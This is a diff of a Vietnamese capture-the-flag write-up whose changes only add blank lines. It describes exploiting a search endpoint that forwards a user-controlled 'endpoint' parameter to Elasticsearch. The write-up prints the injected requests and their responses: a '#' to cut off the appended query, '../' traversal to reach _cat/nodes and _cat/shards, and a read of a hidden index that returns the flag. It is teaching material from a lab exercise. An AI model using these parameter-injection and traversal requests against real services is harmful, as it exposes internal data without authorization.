@@ -70,6 +70,7 @@ $(document).ready(function() {
 ```
 
 Ngồi fuzz thử XSS, RCE, đủ thứ trên trời dưới đất thì mình dừng ở `q=*&endpoint=search`
+
 Reponse:
 ```
 HTTP/1.1 200 OK
@@ -136,24 +137,28 @@ Mà 1 nodes thì cũng như là trung tâm của việc lưu trữ dữ liệu, 
 Để xem thông tin của nodes thì mình phải dùng _cat/nodes
 
 `q=a&endpoint=_cat/nodes`
+
 Reponse: 
 `Error while JSON decoding:No handler found for uri [/articles/articles/__cat/nodes?q=a] and method [GET]`
 
 Nói dễ hiểu thì mình đang route `/articles/articles/_` , nên khi param endpoint nhận giá trị là `search` ta vô tình gọi api `_search` elastic. Vậy nên mình thử xem ở route này có api cat ko 
 
 `q=a&endpoint=cat/nodes`
+
 Reponse:
 `Error while JSON decoding:No handler found for uri [/articles/articles/_cat/nodes?q=a] and method [GET]`
 
 Trước tiên là, chưa chắc ở đây có api cat hay không và thứ 2 là phần backend auto concat thêm phần giá trị param q được set bởi request nên mình cần escape chỗ này lại 
 
 `q=a&endpoint=cat/nodes#`
+
 Reponse:
 `Error while JSON decoding:No handler found for uri [/articles/articles/_cat/nodes] and method [GET]`
 
 Vậy là đã escape được param `q=` và biết được ở đây không có api `_cat`, mình giải quyết bằng cách leo lên các dir khác, nhảy lên bao nhiêu thì tùy vào nhân phẩm nữa :))) 
 
 `q=a&endpoint=../../../../_cat/nodes#`
+
 Reponse:
 `Error while JSON decoding:127.0.0.1 7 96 0 0.00 0.00 0.00 mdi * Cluster_01_Node_001`
 
@@ -161,6 +166,7 @@ Nhảy lên 4 dir thì có api cat được gọi ra, vậy thì mình biết đ
 Vậy thì mình sẽ xem tiếp các shards (Theo như mình đọc thì thường chúng ta không làm việc trực tiếp với các shards vì nó chỉ là 1 phần rất nhỏ tạo nên nodes)
 
 `q=a&endpoint=../../../../_cat/shards#`
+
 Reponse:
 ```
 Error while JSON decoding:articles   4 p STARTED    1 7.5kb 127.0.0.1 Cluster_01_Node_001
@@ -192,6 +198,7 @@ https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html
 vì 2 shards articles và secr3td4ta là cùng 1 level với nhau nên tổ chức thư mục chắc cũng ngang cấp với nhau nên mình có được request
 
 `q=a&endpoint=../../../../secr3td4ta/_search#`
+
 Reponse:
 `[{"title":"Flag Is Here, Grab it :)","_id":"AWoSY9h7LaY_ZeX1ck78","_type":"fl4g?","downloadLink":null}]`
 
